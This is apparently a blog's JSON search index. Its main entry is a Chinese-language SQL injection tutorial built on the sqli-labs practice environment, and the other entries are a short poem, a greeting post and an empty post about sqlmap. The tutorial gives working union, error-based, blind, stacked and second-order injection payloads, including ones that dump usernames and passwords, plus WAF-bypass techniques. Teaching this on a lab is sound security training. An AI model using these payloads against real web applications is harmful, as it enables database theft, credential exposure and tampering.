[{"title":"SQL注入","url":"/post/e73517db.html","content":"\n\n什么是SQL注入\nSQL 注入就是指 web应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql语句来实现 对数据库的任意操作。\n\nSQL注入攻击思路\n\n判断是否存在注入\n判断注入类型\n猜解语句中的字段数\n判断回显位置\n爆数据库名\n爆表名\n爆字段名\n查找内容\n\n\n判断是否存在SQL注入\n最为经典的单引号判断法：在参数后面加上单引号,比如: http://xxx/abc.php?id=1&#39; 如果页面返回错误，则存在SQL注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错。\n\n判断SQL注入类型类型分为两种：数字型和字符型\n\n数字型判断：可以使用经典的 and 1=1 和 and 1=2 来判断：\n\n\nurl中输入？id=1 and 1=1 页面依旧正常运行，继续下一步url中输入？id=1 and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。\n\n\n字符型判断：可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：\n\n\nurl中输入1’ and ‘1’ = ‘1,页面运行正常，继续进行下一步。url中继续输入1’ and ‘1’ = ‘2,页面运行错误，则说明此 Sql 注入为字符型注入。\n\n常见的注入方式\n联合注入\n布尔盲注\n时间盲注\n宽字节注入\n报错注入\n堆叠注入\n二次注入\n……\n\n联合注入注入一般流程：\n\n\n判断注入点\n判断字段数\n判断回显位置\n爆破库名\n爆破表名\n爆破字段名\n爆破字段值\n\n\n以sql-libs/Less-1为例(1)判断注入点\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=1 --+\tpayload： http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=2 --+\t\t根据页面回显不同，判断id参数存在sql注入(2)判断字段数 order by\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; order by x --+\t发现x=3时有回显，x=4时无回显，判断出存在三列(3)判断回显位置 union select\t需将参数的数据值设为不存在\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,3 --+ \t判断出回显位置为2，3(4)爆破库名 在回显位置替换参数即可\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,database(),3 --+ (5)爆破表名 \tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+ (6)爆破字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 --+ (7)爆破字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),3 --+\n\n报错注入应用场景：查询不回显内容，会打印错误信息\n\n常用函数：floor(),updatexml(),extractvalue()\n\n以updatexml()为例(1)爆表 修改 limit 0,1 参数 依次爆出所有表名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+(2)爆字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段名(3)爆字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值(4)爆对应的密码\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select password from users where username = &#x27;Dumb&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值\n\n布尔盲注应用场景：\n\n代码存在sql注入漏洞，然而页面不会显数据，也不会显错误信息。只返回”right” 与wrong 这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的“真”和“假”来识别我们的判断是否正确，这就是布尔盲注。\n\n常用函数：\n\nleft()       left(database(),1)&gt;’s’    database()显示数据库名称，left(a,b)从左侧截取a的前b位。 regexp           select user() regexp ‘^r’  正则表达式用法 user()结果为root,regexp为匹配root的正则表达式like         select users() like ‘’ro%’   与regexp类似，使用like进行匹配substr函数   ascii() 函数    ascii(substr(select database()),1,1)=98 从1位置开始截取数据库名字的1个长度，ascii()将字符转化为ascii值。 ord()   mid()     mid(a,b,c)ord(mid((select user()),1,1))=114从位置b开始，截取a字符串的c位，ord()函数通ascii()，将字符转为ascii值。\n\n时间盲注时间盲注是什么？\n\n通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数\n看加载页面的时间来判断注入点\n适用场景：没有回显，甚至连注入语句是否执行都无从得知\n\n常用函数：\n\nsleep() – 返回0 命令中断返回1substr(a,b,c) – 从b为止开始截取字符串a的c长度mid() – 与substr完全一致count() – 计算总数ascii() – 返回第一个字符的ASII码ord() – 与ascii完全一致length() – 返回字符串的长度left() – 从左往右截取字符串right() –从右往左截取字符串if(condition,true,false)：condition为条件，条件为真返回true，条件为假返回false\n\n注入一般流程：\n\n先用length()获取数据库长度用substr() and sleep() 来确定每一个字符，从而确定数据库\n\n堆叠注入\n原理介绍： 在SQL中，分号（;）是用来表示一条sql语句的结束。\n\n\n联合注入也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者unionall执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 \n\n\n局限性： 使用该注入，需要知道数据库的一些信息，例如表名，列名等。并不是每种环境都可以使用。oracle数据库不行，mysql、mssql‘postgresql可以。  \n\n\n应用实例：已经爆破出管理员密码，但是是加密存储，且无法解密。可以使用堆叠注入，在该表中注入 \n\n举个栗子;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)=&#x27;r&#x27;,sleep(3),1)\n\n二次注入\n原理 分为两步：第一步：插入恶意数据第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行转义，在写入数据库时还是保留用户输入的数据，但是该数据中包含恶意内容。 \n第二步：引用恶意数据在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 \n\n\n例如：输入参数1’     参数经过转义函数变为1&#39;    参数进入数据库存储还原为1’寻找另一处引用这个数据的操作将1’从数据库中取出       取出后直接给变量并且带入SQL   SQL注入触发 实战   sql-lib 24 1.在创建用户界面 创建 admin’#  123 账号 2.登录  admin ‘#  123 账号 修改admin’#密码为  123456 3.发现 admin 密码变为123456\n\n\n实战   sql-lib 241.在创建用户界面 创建 admin’#  123 账号2.登录  admin ‘#  123 账号 修改admin’#密码为  1234563.发现 admin 密码变为123456\n\nSQL注入绕过\n注入符号绕过常见的注释符号有\n\n-- 注释内容# 注释内容/*注释内容*/;\n\n\n大小写绕过\n\n举个例子select * from users where id = -1 union select 1,2,3\n\n\n内联注释绕过\n内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。\n\n举个例子select * from users where id = -1 union /*!select*/ 1,2,3;\n\n\n双写关键字绕过将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。\n\n十六进制绕过\n\n\n举个例子test1等价于0x7465737431select * from users where username = 0x7465737431;\n\n\n空格过滤绕过\n\n/**/()回车(url编码中的%0a)`(tap键上面的按钮)tap两个空格\n\n\n过滤or and xor not 绕过\n\nand = &amp;&amp;or = ||xor = | # 异或not = !\n\n\n过滤等号=绕过不加通配符的like执行的效果和=一致，所以可以用来绕过。利用大小于号、!配合使用进行绕过\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"sqlmap使用方法","url":"/post/11f9f536.html","content":"\n","categories":["网络安全"],"tags":["web安全"]},{"title":"无题","url":"/post/9b44950b.html","content":"\n\n\n你路过我的春光明媚\n离开我的望穿秋水\n当雾气锁住凝眉\n当笛声告别夕炊\n最好你舍得我送别的眼\n从此一去不回\n最好我忘掉你流水的心\n再无浊酒一杯\n当我赶起羊群踏尽青草\n当你忘了路过此地朝朝暮暮\n天晓得柔情似水\n妄想谁泪眼愁眉\n等到所有的故事都死去\n我爱过的人都成灰\n有的变成河水\n有的变成眼泪\n该请谁来聆听\n荒野的风声吹向月亮\n我心如荒野    凛风不歇\n该请谁来触及\n青山的恻隐藏了四季\n我身如青山    瘦贫瘠该\n请谁来抵达\n镜中青花结成了白发\n我灵魂如镜    虚罄年华\n该请谁来行歌\n长河两侧的落落景色\n我生如长河    终生奔波\n终生    一无所获\n\n","categories":["我同桌的文集"]},{"title":"Hello World！","url":"/post/24608.html","content":"\n\n去没人的岛，摸鲨鱼的角。\n"}]